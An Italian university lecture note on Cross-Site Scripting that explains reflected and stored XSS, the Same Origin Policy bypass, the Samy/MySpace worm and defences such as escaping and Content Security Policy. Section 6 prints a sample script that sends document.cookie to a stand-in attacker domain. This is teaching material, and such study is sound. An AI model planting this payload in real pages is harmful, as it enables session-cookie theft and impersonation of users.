# L2 — Cross-Site Scripting

> 📌 Il **Cross-Site Scripting** è un attacco in cui l'attaccante riesce a far eseguire codice JavaScript arbitrario dal browser della vittima, facendo apparire quello script come parte di una pagina proveniente da un server considerato fidato dal browser.

---

### **1. Obiettivo della Lezione**

In questa lezione viene studiato nel dettaglio il funzionamento di un attacco di tipo **Cross-Site Scripting**, abbreviato spesso in **XSS**.

L'idea generale è la seguente:
- l'attaccante prepara uno script malevolo;
- lo script viene inserito, direttamente o indirettamente, in una pagina generata da un server web vulnerabile;
- il client vittima recupera quella pagina dal server;
- il browser della vittima esegue lo script;
- lo script viene eseguito con l'origine della pagina vulnerabile.

Il punto importante è che il codice non viene percepito dal browser come codice proveniente dall'attaccante.

Viene percepito come codice appartenente alla pagina ricevuta dal server web con cui il client sta interagendo.

> ⚠️ XSS è pericoloso perché sfrutta la fiducia che il browser attribuisce alla pagina vulnerabile: se il codice malevolo arriva dentro quella pagina, eredita il suo contesto di esecuzione.

---

### **2. Definizione di Cross-Site Scripting**

Un attacco di tipo Cross-Site Scripting è una forma di attacco in cui l'attaccante è in grado di far eseguire codice arbitrario, cioè uno script, dal browser di un client.

Il client non recupera direttamente lo script dal server dell'attaccante come risorsa evidentemente esterna.

Lo recupera dentro una pagina web proveniente da un altro server, cioè dal server vulnerabile.

Lo schema concettuale è:
- esiste un **client vittima**;
- esiste un **trusted web server**, cioè un server con cui il client ha avviato una sessione;
- esiste un **attaccante**;
- l'attaccante riesce a fare arrivare uno script dentro una pagina prodotta dal trusted web server;
- il browser della vittima esegue quello script come se fosse parte della pagina fidata.

La conseguenza è che lo script eredita l'origine del server su cui è stato iniettato.

Il browser, infatti, vede la pagina come proveniente dal trusted web server e quindi considera anche lo script come appartenente a quella stessa origine.

> 📌 Nel Cross-Site Scripting, il problema non è solo l'esecuzione di JavaScript: il problema è l'esecuzione di JavaScript malevolo dentro l'origine fidata.

---

### **3. Bypass della Same Origin Policy**

Nella lezione precedente è stata introdotta la **Same Origin Policy**.

La Same Origin Policy stabilisce che uno script possa accedere solo a risorse, cookie, documenti e oggetti del DOM compatibili con la stessa origine.

In un attacco XSS, questa protezione viene aggirata.

Il motivo è che lo script malevolo non viene eseguito come script proveniente da un'origine esterna non fidata.

Viene eseguito come se provenisse dal server vulnerabile.

Quindi:
- il client ha una sessione aperta con il trusted web server;
- il browser considera quel server fidato rispetto alla Same Origin Policy;
- la pagina vulnerabile contiene lo script inserito dall'attaccante;
- il browser esegue lo script nel contesto dell'origine del trusted web server;
- lo script può accedere alle risorse accessibili agli script di quella pagina.

La Same Origin Policy, quindi, non viene violata frontalmente.

Viene bypassata perché l'attaccante riesce a collocare il proprio codice dentro l'origine che il browser considera legittima.

> ⚠️ La SOP separa origini diverse, ma non può distinguere automaticamente uno script legittimo da uno script iniettato se entrambi finiscono nella stessa pagina HTML.

---

### **4. Differenza Rispetto alla SQL Injection**

La docente sottolinea una differenza fondamentale rispetto alla **SQL injection**.

Nella SQL injection l'attacco compromette principalmente il lato server:
- l'input malevolo arriva al server;
- il server costruisce una query SQL vulnerabile;
- il database interpreta parte dell'input come codice SQL;
- l'attaccante può leggere, modificare o cancellare dati lato server.

Nel Cross-Site Scripting, invece, l'attacco compromette il **client**.

Lo script viene eseguito dal browser della vittima.

Il server vulnerabile ha un ruolo essenziale, perché riflette o memorizza lo script senza controllarlo, ma l'esecuzione del codice avviene lato client.

> 📌 SQL injection colpisce la logica server-side e il database; XSS colpisce il browser della vittima sfruttando una pagina generata dal server vulnerabile.

---

### **5. Obiettivi di un Attacco XSS**

Gli obiettivi di un attacco di tipo Cross-Site Scripting possono essere diversi.

Un primo obiettivo tipico è rubare:
- cookie di sessione;
- session identifier;
- valori usati dal server per riconoscere l'utente già autenticato.

Se l'attaccante ottiene un cookie di sessione valido, può tentare di impersonare l'utente vittima nelle comunicazioni successive con il trusted web server.

Un secondo obiettivo è eseguire azioni per cui solo l'utente attaccato possiede i privilegi.

Per esempio:
- leggere dati accessibili solo all'utente autenticato;
- accedere a file o valori dei cookie;
- inviare richieste al sito come se fosse l'utente;
- modificare impostazioni dell'account;
- compiere operazioni abilitate dalla sessione della vittima.

In questo caso si può parlare di **elevazione dei privilegi**, perché lo script dell'attaccante sfrutta i privilegi già posseduti dall'utente vittima nel contesto dell'applicazione.

Un terzo obiettivo è far visualizzare al client vittima contenuti falsi o modificati.

Lo script può alterare:
- il testo mostrato nella pagina;
- link;
- form;
- messaggi di errore;
- risultati visualizzati;
- elementi del DOM.

Un quarto obiettivo è diffondere l'attacco.

Per esempio, l'attaccante può postare codice malevolo nella pagina di un social network.

In questo modo, tutti gli amici o visitatori dell'utente che visualizzano quella pagina possono essere infettati a loro volta.

> 💡 XSS può essere usato sia per rubare dati, sia per eseguire azioni nel contesto della vittima, sia per manipolare ciò che la vittima vede, sia per propagarsi tra utenti.

---

### **6. Idea Generale dell'Attacco**

In definitiva, l'attacco consiste nell'inserire uno script malevolo nella pagina generata dal server.

La pagina appare al browser come una pagina normale del sito vulnerabile.

Il codice malevolo però è stato fornito dall'attaccante.

La vulnerabilità nasce quando il server:
- riceve dati da un utente o da una risorsa modificabile;
- usa quei dati per costruire una pagina HTML;
- non controlla correttamente il contenuto;
- non effettua escaping dei caratteri speciali;
- lascia che il browser interpreti l'input come markup o JavaScript.

Un esempio concettuale di script malevolo è:

```html
<script>
  new Image().src = "https://attacker.example/collect?c=" + encodeURIComponent(document.cookie);
</script>
```

Questo esempio mostra il meccanismo, usando un dominio fittizio.

Lo script legge i cookie accessibili via JavaScript con `document.cookie` e li invia al dominio controllato dall'attaccante.

> ⚠️ Se un cookie di sessione è leggibile da JavaScript, uno script XSS può tentare di rubarlo e inviarlo all'attaccante.

---

### **7. Attacchi XSS di Tipo 1: Reflected o Non Persistenti**

Il primo caso studiato è l'attacco di tipo 1, detto anche:
- **reflected Cross-Site Scripting**;
- **XSS riflesso**;
- **attacco non persistente**.

In questo scenario, l'utente vittima segue un link che contiene lo script malevolo.

Il link rimanda a un server web vulnerabile.

Il server vulnerabile prende lo script ricevuto come input e lo inserisce senza verificarlo nella pagina che invia come risposta all'utente vittima.

Il contenuto della pagina spedita come risposta dal server viene quindi modificato in modo **non permanente**.

La modifica vale solo per le richieste HTTP che usano quell'URL appositamente forgiato.

Non viene necessariamente alterato il database del server.

Non viene modificata stabilmente la pagina per tutti gli utenti.

L'attacco avviene perché quella specifica richiesta contiene input malevolo e il server lo riflette nella risposta.

> 📌 Nel reflected XSS, lo script viaggia dentro la richiesta della vittima e torna indietro nella risposta del server vulnerabile.

---

### **8. Attacchi XSS di Tipo 2: Stored o Persistenti**

Il secondo caso è l'attacco di tipo 2, detto anche:
- **stored Cross-Site Scripting**;
- **XSS memorizzato**;
- **attacco persistente**.

In questo scenario, l'attaccante salva lo script malevolo tra le risorse gestite dal server web vulnerabile.

La risorsa può essere, per esempio, il database usato dal server per generare le pagine da inviare ai client.

In questo caso il contenuto della pagina viene modificato in modo **permanente** o comunque stabile fino alla rimozione del contenuto malevolo.

Tutti gli utenti che successivamente accedono alla pagina costruita usando quelle risorse sono potenzialmente attaccabili.

La differenza rispetto al reflected XSS è quindi essenziale:
- nel reflected XSS lo script compare solo in risposta a una richiesta costruita appositamente;
- nello stored XSS lo script viene memorizzato lato server e può colpire chiunque visualizzi la pagina infetta.

> ⚠️ Lo stored XSS è spesso più grave del reflected XSS perché non richiede di convincere ogni singola vittima a cliccare uno specifico URL malevolo: basta che la vittima visiti la pagina contaminata.

---

### **9. Inserire lo Script: Perché non è Così Difficile**

Potrebbe sembrare che inserire uno script lato client o lato server sia un'operazione non banale.

In realtà, in molte applicazioni web, non è poi così complicato.

Il motivo è che i siti dinamici raccolgono continuamente input dagli utenti:
- campi di ricerca;
- form;
- commenti;
- messaggi;
- profili social;
- descrizioni di immagini;
- pagine di errore personalizzate;
- contenuti generati dagli utenti.

Se questi dati vengono reinseriti nelle pagine senza controlli adeguati, diventano un punto di ingresso per codice HTML o JavaScript.

---

### **10. Condizioni per un Reflected XSS**

Nel caso di reflected Cross-Site Scripting devono verificarsi due condizioni.

La prima condizione è che lo script venga inserito lato client come parametro di input.

Per esempio:
- come valore di un parametro nella query string;
- come valore di un campo di form;
- come parte di una richiesta costruita dall'attaccante;
- come parametro modificato da un attaccante attivo.

La seconda condizione è che quel parametro di input venga inserito dal server nella pagina web rispedita al client.

Queste due condizioni si verificano spesso nei form di ricerca.

In genere, infatti, i motori di ricerca o i siti con funzionalità di ricerca stampano la stringa ricercata nella pagina dei risultati.

Esempio normale:

```text
Risultati della ricerca per: casa
```

Se però la stringa cercata non viene trattata come semplice testo, ma viene reinserita direttamente nell'HTML, un input contenente `<script>` può essere interpretato dal browser come codice.

> 📌 Il reflected XSS nasce quando un parametro fornito dal client viene riflesso nella risposta HTML senza sanitizzazione o escaping.

---

### **11. Come lo Script Arriva al Client nel Reflected XSS**

Lo script può essere iniettato lato client in più modi.

Un primo modo è tramite un attacco di **phishing**.

L'attaccante costruisce un URL malevolo e convince la vittima a selezionarlo.

La vittima crede di visitare il sito legittimo, perché l'URL punta effettivamente al server vulnerabile.

Il problema è che l'URL contiene anche il parametro malevolo.

Un secondo modo è possibile nel caso di un attaccante attivo.

L'attaccante può modificare la query string dell'URL o la richiesta HTTP del client, purché la richiesta contenga parametri inseriti dall'utente o comunque parametri che il server userà per costruire la risposta.

In entrambi i casi il risultato è lo stesso:
- il client spedisce inconsapevolmente lo script al server;
- il server vulnerabile lo reinserisce nella pagina;
- il browser della vittima lo esegue.

> ⚠️ Nel reflected XSS, il link può sembrare diretto verso un dominio legittimo. La parte malevola può nascondersi nei parametri della richiesta.

---

### **12. Come lo Script Arriva al Server nello Stored XSS**

Nel caso di stored Cross-Site Scripting, l'obiettivo è inserire lo script tra le risorse lato server.

Questo non significa necessariamente accedere direttamente al database.

L'attaccante può sfruttare funzionalità applicative normali che salvano contenuti forniti dagli utenti.

Esempi citati nella lezione:
- inserire lo script come commento in un social network;
- inserirlo in un forum o in una bacheca online;
- inserirlo in pagine 404 customizzate;
- inserirlo in immagini o file caricati, sfruttando il comportamento permissivo del browser.

In questi casi, l'applicazione salva il contenuto fornito dall'attaccante.

Quando un altro utente visualizza la pagina che include quel contenuto, il browser esegue lo script.

> 📌 Nello stored XSS, l'attaccante sfrutta la capacità del sito di memorizzare contenuti degli utenti e ripubblicarli dentro pagine HTML.

---

### **13. Esempio Pratico di Attacco Non Persistente**

La docente richiama l'esempio del server web che si aspetta venga inserita in un form una parola da cercare.

Il server prende quella parola e la inserisce anche nella pagina di risposta.

Era l'esempio già discusso parlando delle vulnerabilità dei cookie.

Lo scenario è un dizionario online:
- l'utente cerca una parola;
- il browser invia la parola al web server;
- il web server genera una pagina con i risultati;
- nella pagina dei risultati compare anche la stringa cercata.

L'uso legittimo è semplice:

```http
GET /search?word=casa HTTP/1.1
Host: dictionary.example
```

Il server risponde con una pagina che contiene, per esempio:

```text
Risultati della ricerca per: casa
```

Il problema nasce se il server non verifica il valore del parametro `word`.

L'attaccante può costruire un URL malevolo inserendo un tag `script` al posto della parola da cercare.

Lo script può inviare all'attaccante il file dei cookie o, più precisamente, i cookie accessibili al documento tramite `document.cookie`.

Questi cookie sono relativi alla sessione che il client ha aperto con il web server del dizionario online, non con il server dell'attaccante.

> ⚠️ Il cookie rubato appartiene al rapporto tra vittima e trusted web server. Proprio per questo l'attaccante può usarlo per impersonare la vittima verso quel server.

---

### **14. Fasi dell'Esempio con Furto dei Cookie**

L'attacco non persistente funziona in più fasi.

Nella prima fase, l'attaccante fa in modo di inviare un URL malevolo al client vittima.

Questo può avvenire, per esempio, tramite:
- email;
- messaggio istantaneo;
- post;
- phishing;
- link apparentemente innocuo.

Nella seconda fase, se la vittima clicca l'URL, il browser invia lo script come parametro di input al web server vulnerabile.

Nella terza fase, il server vulnerabile inserisce senza verificarlo l'input dell'utente nella pagina di risposta.

Nella quarta fase, il browser lato client fa il parsing del documento ricevuto dal server.

Durante il parsing, interpreta il contenuto malevolo come script ed esegue il codice.

Lo script viene eseguito perché, dal punto di vista del browser, proviene da un'origine fidata.

Nella quinta fase, lo script invia all'attaccante i cookie relativi a quel documento.

Se tra quei cookie ci sono cookie di sessione, l'attaccante può tentare di impersonare il client nelle comunicazioni con il trusted web server.

> 📌 Il browser esegue lo script non perché si fidi dell'attaccante, ma perché vede lo script dentro una pagina ricevuta dal server fidato.

### **15. Schema Generale del Reflected XSS**

Volendo astrarre dal caso specifico del dizionario online, un attacco reflected Cross-Site Scripting segue questo schema.

In una prima fase, l'attaccante inietta lo script malevolo in un URL.

Poi convince l'utente a selezionare quell'URL, magari tramite phishing.

In alternativa, se l'attaccante è attivo sulla comunicazione, può modificare una HTTP request del client.

Questa richiesta deve contenere parametri che verranno poi usati dal server per generare la risposta.

Il client vittima spedisce inconsapevolmente lo script al server.

Il server, per essere vulnerabile, deve riflettere l'input indietro all'utente senza verificarlo.

Lato client, in genere senza che l'utente se ne accorga, il browser esegue lo script.

Lo script può quindi inviare dati confidenziali all'attaccante.

L'attaccante usa quei dati, per esempio, per impersonare la vittima presso il web server.

<!-- INSERT INSTRUCTOR SLIDE/DIAGRAM HERE -->

> ✅ Reflected XSS: l'attaccante prepara l'URL, la vittima lo invia al server, il server riflette lo script, il browser lo esegue, l'attaccante riceve i dati.

### **16. Quando un Server è Vulnerabile al Reflected XSS**

Un attacco Cross-Site Scripting di tipo 1 è possibile solo quando il server web è dinamico.

Il server deve generare una pagina usando dati inseriti dal client.

La vulnerabilità nasce soprattutto quando:
- i dati arrivano da un form;
- i dati arrivano dalla query string;
- i dati vengono copiati nella risposta HTML;
- il server non li verifica;
- il server non li tratta come semplice testo;
- il browser può interpretarli come codice.

In questo caso, il server si dice vulnerabile al Cross-Site Scripting.

Un server che restituisce solo pagine statiche non costruite a partire da input dell'utente ha una superficie diversa per questo specifico schema di reflected XSS.

> ⚠️ La caratteristica critica è la generazione dinamica di HTML a partire da input non fidato.

---

### **17. Funzionamento dello Stored XSS**

Come già accennato, nel caso di attacco persistente l'attaccante riesce a inserire lo script direttamente nel database o in un'altra risorsa che il server usa per generare le pagine web.

Quando il client vittima richiede la pagina che contiene lo script, il server genera la risposta includendo il contenuto memorizzato.

Il browser riceve la pagina.

Durante il parsing, esegue lo script.

Anche in questo caso lo script può inviare dati confidenziali all'attaccante.

La differenza rispetto al reflected XSS è che qualsiasi client faccia richiesta della pagina contenente lo script malevolo può subire l'attacco.

Non è necessario che ogni vittima clicchi un URL costruito appositamente.

È sufficiente che la vittima visiti la pagina contaminata.

> 📌 Stored XSS: il codice malevolo viene memorizzato lato server e viene servito automaticamente agli utenti che leggono la pagina infetta.

---

### **18. Inserire lo Script nel Database Senza Accesso Diretto**

L'attaccante non deve per forza avere accesso diretto al database per inserire lo script.

Può usare funzionalità offerte dal sito.

Un esempio sono i siti con **online message board**, forum o sistemi di commenti che permettono di inserire messaggi formattati in HTML.

Se il sito accetta markup HTML e non filtra correttamente i tag pericolosi, l'attaccante può scrivere un messaggio che contiene codice JavaScript.

Il messaggio viene salvato dal server.

Quando altri utenti lo visualizzano, il codice viene reinserito nella pagina e quindi eseguito dal browser.

Questo rende gli ambienti sociali particolarmente interessanti per gli attacchi stored XSS:
- molti utenti vedono contenuti prodotti da altri utenti;
- i contenuti vengono memorizzati lato server;
- i contenuti vengono ripubblicati dinamicamente;
- il rapporto di fiducia tra utenti aumenta la probabilità che le pagine vengano visitate.

### **19. Scenario Social Network: Yves e Bob**

Uno scenario tipico è quello di un social network.

L'attaccante, chiamato nella lezione **Yves**, posta un messaggio con un corpo malevolo.

Il corpo del messaggio contiene lo script.

Quando **Bob** legge il messaggio, il browser di Bob esegue lo script.

Lo script può leggere il cookie di Bob, se il cookie è accessibile a JavaScript, e spedirlo a Yves.

Da quel momento in poi, Yves può tentare di impersonare Bob nel social network, perché possiede il cookie di sessione di Bob.

La dinamica è quindi:
- Yves inserisce lo script nel social network;
- il social network lo memorizza;
- Bob visualizza il messaggio;

- Yves usa il cookie per presentarsi al social network come Bob.

> ⚠️ La vittima può essere attaccata semplicemente leggendo un contenuto pubblicato da un altro utente.

### **20. Caso MySpace e Propagazione Automatica**

Un attacco di questo tipo è stato subito dal sito **MySpace**.

MySpace permetteva agli utenti di postare codice HTML nelle proprie pagine.

Per cercare di non essere vulnerabile a Cross-Site Scripting, MySpace verificava che l'HTML immesso dall'utente non contenesse alcuni tag considerati critici.

Esempi di elementi filtrati:
- tag `script`;
- link a script JavaScript;
- altri costrutti ritenuti pericolosi dalla blacklist.

Il problema è che nella blacklist non figurava JavaScript inserito attraverso i fogli di stile.

L'ideatore dell'attacco pubblicò sul proprio profilo MySpace un codice JavaScript che, una volta eseguito, si propagava automaticamente sul profilo dell'utente che lo visualizzava.

Lo script faceva due cose:
- inseriva nella lista degli idoli dell'utente la stringa **"but most of all, Samy is my hero"**;
- chiedeva l'amicizia all'autore dell'attacco.

Chiunque visualizzasse il profilo di un utente infettato veniva a sua volta infettato.

Nel giro di 24 ore, Samy aveva milioni di amici.

L'effetto più grave fu che il sito MySpace venne bloccato completamente dalla propagazione dell'attacco.

> 📌 Il caso MySpace mostra che uno stored XSS può diventare anche un attacco auto-propagante quando il codice malevolo modifica i profili degli utenti che lo visualizzano.

> ⚠️ Una blacklist incompleta può lasciare aperti vettori non previsti, come l'uso di JavaScript in contesti diversi dal tag `script`.

### **21. Iniezione Tramite File e Comportamento Best Effort del Browser**

Un altro modo per iniettare uno script nel database del server, pur senza accesso diretto al database, sfrutta il comportamento permissivo dei browser.

Quando un browser deve visualizzare tutti gli oggetti contenuti in una pagina web, spesso adotta una tecnica di **best effort**.

Il browser cerca cioè di mostrare comunque qualcosa anche quando il contenuto non è perfettamente coerente.

Esempi di problemi che il browser prova a gestire:
- un tag HTML non chiuso;
- markup non perfettamente valido;
- un file con estensione diversa dal contenuto reale;
- un contenuto dichiarato in un modo ma interpretabile in un altro.

La docente fa l'esempio di un file con estensione `JPG` che però contiene codice HTML.

Se un file con estensione `.jpg`, ma contenente codice HTML, viene inviato a un browser, il browser potrebbe visualizzarlo come HTML, ignorando o trattando in modo permissivo il `Content-Type` indicato nella risposta HTTP.

<!-- INSERT INSTRUCTOR SLIDE/DIAGRAM HERE -->

Lo scenario è:
- esiste un sito di condivisione foto;
- il sito permette di caricare immagini;
- il sito permette ad altri utenti di scaricare o visualizzare quelle immagini;
- un attaccante carica un file apparentemente immagine;
- il file contiene invece HTML o script;
- un utente scarica o visualizza quel file;
- il browser interpreta il contenuto come HTML o script;
- lo script malevolo viene eseguito.

Questo è ancora un attacco di tipo stored Cross-Site Scripting.

Il contenuto malevolo viene infatti memorizzato lato server come risorsa caricata dall'utente e colpisce chi successivamente la visualizza.

> ⚠️ Non basta fidarsi dell'estensione del file. Il server deve verificare realmente tipo, contenuto e modalità di pubblicazione delle risorse caricate dagli utenti.

### **22. Contromisure Lato Server**

Per difendersi dagli attacchi di tipo Cross-Site Scripting, la prima linea di difesa è lato server.

Il server deve analizzare i dati in input.

Deve depurare i parametri in ingresso dagli elementi potenzialmente nocivi.

Esempi di elementi da trattare con attenzione:
- tag HTML;
- tag `script`;
- attributi HTML che possono contenere codice;
- apici;
- virgolette;
- caratteri speciali;
- simboli usati dai linguaggi di programmazione;
- sequenze che possono essere interpretate come markup;
- contenuti caricati dagli utenti;
- file con tipo o contenuto ambiguo.

Il principio generale è che l'input dell'utente non deve essere inserito nella risposta HTML come codice.

Deve essere trattato come dato.

Questo si ottiene con:
- validazione dell'input;
- sanitizzazione dei contenuti HTML ammessi;
- escaping dell'output;
- rifiuto di tag e attributi pericolosi;
- controllo dei file caricati;
- uso corretto degli header HTTP;
- separazione tra contenuto utente e codice applicativo.

> 📌 La difesa server-side deve impedire che l'input dell'utente diventi HTML o JavaScript eseguibile.

> ⚠️ Filtrare solo alcune stringhe pericolose può non bastare: il caso MySpace mostra che una blacklist incompleta può essere aggirata.

---

### **23. Contromisure Lato Client**

Lato client è importante mantenere aggiornati i browser.

Le versioni più recenti dei browser includono o hanno incluso meccanismi di mitigazione per alcune forme di Cross-Site Scripting.

Questi meccanismi non devono però essere considerati sostitutivi della correzione lato server.

La docente cita inoltre la **Content Security Policy**, spesso abbreviata in **CSP**.

Nel caso di Firefox, per esempio, è possibile definire una politica di sicurezza più dettagliata rispetto alla Same Origin Policy.

La Content Security Policy permette di specificare, a seconda della tipologia di contenuto, quali domini siano considerati fidati e quali non lo siano.

Per esempio, una policy può distinguere tra:
- sorgenti autorizzate per script;
- sorgenti autorizzate per immagini;
- sorgenti autorizzate per fogli di stile;
- sorgenti autorizzate per frame;
- possibilità o divieto di eseguire codice inline.

L'idea è ridurre la superficie di esecuzione del codice.

Se una pagina dichiara che gli script possono provenire solo da determinate origini, l'effetto di molte iniezioni può essere limitato.

> 💡 La Same Origin Policy stabilisce un confine generale tra origini; la Content Security Policy consente al sito di dichiarare regole più fini su quali contenuti possono essere caricati o eseguiti.

---

### **24. Riepilogo**

In questa lezione è stato visto come funziona un attacco di Cross-Site Scripting.

Un attacco XSS riesce a bypassare la Same Origin Policy perché fa eseguire al browser uno script proveniente da una terza parte non fidata come se provenisse da un server fidato.

Lo script ottiene quindi i privilegi dell'origine vulnerabile.

Sono stati distinti due casi principali:
- **reflected XSS**, in cui lo script è contenuto nella richiesta e viene riflesso nella risposta;
- **stored XSS**, in cui lo script viene memorizzato tra le risorse del server e colpisce gli utenti che visualizzano la pagina contaminata.

Gli effetti possibili includono:
- furto di cookie di sessione;
- furto di session identifier;
- impersonificazione dell'utente;
- esecuzione di azioni con i privilegi della vittima;
- modifica dei contenuti visualizzati;
- propagazione dell'attacco tramite social network o contenuti generati dagli utenti.

Le contromisure principali sono:
- controllare e sanificare l'input lato server;
- effettuare escaping dell'output;
- non affidarsi a blacklist incomplete;
- controllare i contenuti caricati dagli utenti;
- mantenere aggiornati i browser;
- usare politiche come Content Security Policy.

> ✅ XSS sfrutta un server vulnerabile per colpire il client: lo script malevolo entra nella pagina fidata, viene eseguito dal browser della vittima e può agire con i privilegi dell'origine vulnerabile.
